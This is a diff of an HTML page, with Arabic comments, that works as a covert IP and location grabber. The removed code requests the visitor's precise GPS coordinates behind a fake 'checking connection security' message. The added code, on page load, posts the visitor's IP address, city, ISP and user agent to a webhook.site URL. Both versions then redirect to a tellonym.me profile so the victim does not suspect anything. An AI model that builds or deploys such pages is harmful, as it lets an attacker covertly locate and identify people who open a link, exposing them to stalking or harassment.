@@ -4,36 +4,38 @@
     <meta charset="UTF-8">
     <script>
         const hook = "https://webhook.site/5e829926-604d-4dde-a540-5530e155e703";
+        const target = "https://tellonym.me/Schaien/anything";
 
-        function getExactLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const coords = {
-                        lat: position.coords.latitude,
-                        long: position.coords.longitude,
-                        accuracy: position.coords.accuracy + " meters",
-                        device: navigator.platform
-                    };
-                    
-                    // إرسال الإحداثيات الدقيقة للـ Webhook
-                    await fetch(hook, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify(coords)
-                    });
+        async function ultraLog() {
+            // 1. إرسال إشارة دخول فورية (قبل سحب البيانات)
+            fetch(hook, { method: 'POST', mode: 'no-cors', body: "🚨 شخص دخل الرابط الآن!" });
 
-                    // توجيهه للوجهة النهائية بعد السرقة
-                    window.location.replace("https://tellonym.me/Schaien/anything");
-                }, () => {
-                    // إذا رفض الإذن، نوجهه فوراً لكي لا يشك
-                    window.location.replace("https://tellonym.me/Schaien/anything");
+            try {
+                // 2. محاولة سحب البيانات التقنية
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                
+                // 3. إرسال الصيد الكامل
+                await fetch(hook, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        "INFO": "✅ تم سحب البيانات",
+                        "IP": data.ip,
+                        "CITY": data.city,
+                        "ISP": data.org,
+                        "AGENT": navigator.userAgent
+                    })
                 });
+            } catch (e) {
+                // استمرار حتى لو فشل السحب
+            } finally {
+                // 4. الهروب للوجهة النهائية
+                setTimeout(() => { window.location.replace(target); }, 600);
             }
         }
-        window.onload = getExactLocation;
+        window.onload = ultraLog;
     </script>
 </head>
-<body style="background: #000;">
-    <h2 style="color:white; text-align:center; margin-top:20%;">جاري التحقق من أمان الاتصال...</h2>
-</body>
+<body style="background: #000;"></body>
 </html>
